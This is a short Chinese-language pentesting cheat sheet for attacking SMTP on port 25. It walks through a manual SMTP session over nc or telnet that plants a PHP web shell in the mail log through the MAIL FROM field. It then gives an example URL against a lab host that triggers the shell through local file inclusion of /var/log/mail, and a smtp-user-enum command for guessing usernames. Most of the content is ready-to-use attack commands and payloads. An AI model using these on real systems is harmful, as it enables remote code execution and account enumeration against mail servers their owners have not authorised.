# 25（smtp）

1. 普通链接

```bash
nc [ip] [port]  或者：telnet [ip] [port]  
1）HELO [user]    ---向服务器标识用户身份
2）MAIL FROM:"[user] <?php echo shell_exec($_GET['cmd']);?>"   ---MAIL FROM:发件人
3）RCPT TO:[reciver]   ---RCPT TO:收件人
4）DATA    ---开始编辑邮件内容
5）.       ---输入点代表编辑结束
```

1. 敏感目录

```bash
/var/log/mail
```

1. 可能存在的问题

```bash
枚举信息
或者网页能够访问到日志或邮件，由smtp写入后门，或者存在lfi任意访问
举例如下：
http://192.168.56.102/turing-bolo/bolo.php?bolo=../../../../var/log/mail&cmd=id
```

1. 敏感信息枚举

```bash
smtp-user-enum -M VRFY -U [字典] -t 192.168.247.151
-M    ---用于猜测用户名 EXPN、VRFY 或 RCPT 的方法（默认值：VRFY）
-U    ---通过 smtp 服务检查的用户名文件
-t    ---host 服务器主机运行 smtp 服务
字典是这个，也可以选取类似：
/usr/share/metasploit-framework/data/wordlists/unix_users.txt
```
